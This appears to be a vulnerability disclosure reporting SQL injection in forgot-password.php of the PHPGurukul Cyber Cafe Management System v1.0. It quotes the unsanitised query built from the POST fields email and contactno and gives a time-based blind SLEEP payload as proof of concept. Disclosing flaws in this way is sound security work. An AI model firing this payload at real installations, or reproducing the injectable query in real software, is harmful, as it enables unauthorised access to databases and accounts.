# SQLi vulnerability in Cyber Cafe Management System Project v1.0 of file forgot-password.php

**vender**:

[PHP Project, PHP Projects Ideas, PHP Latest tutorials, PHP oops Concept](https://phpgurukul.com/)

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**SoftLink**:

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**Vulnerable File**

- ccms\forgot-password.php

**Version**

- V1.0

### Analyse

`ccms\forgot-password.php:8-11` - 密码重置SQLi

forgot-password.php:8-11

```
$contactno=$_POST['contactno'];
$email=$_POST['email'];

    $query=mysqli_query($con,"select ID from tbladmin where  Email='$email' and MobileNumber='$contactno' ");
```

- **参数**: `email`, `contactno` (POST)
- **危害**: 无需认证即可利用，可绕过密码重置验证

### POC

```bash
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 5189 FROM (SELECT(SLEEP(5)))QyBF)-- rmKk&contactno=1&submit=
---
```



![image-20251212113225029](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512121132177.png)